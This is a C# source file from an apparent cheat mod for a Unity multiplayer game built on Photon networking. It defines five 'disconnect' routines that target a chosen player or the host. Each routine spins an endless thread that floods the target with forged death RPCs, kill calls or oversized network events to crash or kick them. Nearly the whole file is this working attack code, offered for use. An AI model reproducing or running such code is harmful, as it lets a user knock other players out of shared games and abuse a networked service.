#if DEBUG
using System;
using System.Threading;
using ExitGames.Client.Photon;
using UnityEngine;

namespace Mod
{
    public class DCInstance
    {
        private readonly int _dcType;
        private readonly PhotonPlayer _player;
        private Thread _thread;

        public DCInstance(PhotonPlayer player, int dcType = 1)
        {
            _player = player;
            _dcType = dcType;
        }

        public void Start()
        {
            switch (_dcType)
            {
                case 1:
                    _thread = DC1(this);
                    break;
                case 2:
                    _thread = DC2(this);
                    break;
                case 3:
                    _thread = DC3(this);
                    break;
                case 4:
                    _thread = DC4(this);
                    break;
                case 5:
                    _thread = DC5(this);
                    break;
                default:
                    Core.SendMessage("Il dc selezionato non e' esistente");
                    return;
            }
            _thread.Start();
        }

        public void Abort()
        {
            _thread.Abort();
            
        }

        public ThreadState State => _thread.ThreadState;
        public PhotonPlayer Target => _player;

        public static readonly Func<DCInstance, Thread> DC1 = instance => new Thread(() =>
        {
            PhotonView player = null;
            while (true)
            {
                if (player == null || (bool)player.owner.customProperties[PhotonPlayerProperty.dead])
                    for (int i = 1; i < 100; i++)
                        foreach (GameObject obj in GameObject.FindGameObjectsWithTag("Player"))
                            if (!(bool) obj.GetPhotonView().owner.customProperties[PhotonPlayerProperty.dead] && obj.GetPhotonView().owner.ID != instance.Target.ID)
                                player = obj.GetComponent<HERO>().photonView;
                player?.RPC("netDie2", instance.Target);
                Thread.Sleep(350);
            }
        });

        public static readonly Func<DCInstance, Thread> DC2 = instance => new Thread(() =>
        {
            Hashtable customEventContent = new Hashtable { { (byte)1, PhotonNetwork.masterClient.ID } };
            while (true)
            {
                PhotonNetwork.networkingPeer.OpRaiseEvent(208, customEventContent, true, null);
                Thread.Sleep(120);
            }
        });

        public static readonly Func<DCInstance, Thread> DC3 = instance => new Thread(() =>
        {
            while (true)
            {
                FengGameManagerMKII.instance.photonView.RPC("titanGetKill", instance.Target, null);
                Thread.Sleep(30);
            }
        }); 

        public static readonly Func<DCInstance, Thread> DC4 = instance => new Thread(() =>
        {
            Hashtable hash2 = new Hashtable { { 0, 1 }, { 1, 1 }, { 2, 1 } };
            Hashtable hash = new Hashtable();
            for (byte b = 2; b < byte.MaxValue; b++)
                hash.Add(b, hash2);
            hash.Add((byte)0, (int)PhotonNetwork.time);
            while (true)
            {
                PhotonNetwork.RaiseEvent(206, hash, true, new RaiseEventOptions {TargetActors = new [] {instance.Target.ID}});
                Thread.Sleep(120);
            }
        });

        public static readonly Func<DCInstance, Thread> DC5 = instance => new Thread(() =>
        {
            HERO hero = null;
            while (true)
            {
                if (hero == null)
                    hero = Core.GetHero(instance.Target.ID);
                hero?.photonView.RPC("netDie2", PhotonTargets.All, -1, "[00FFFF]test  ");
            }
        });
    }
}
#endif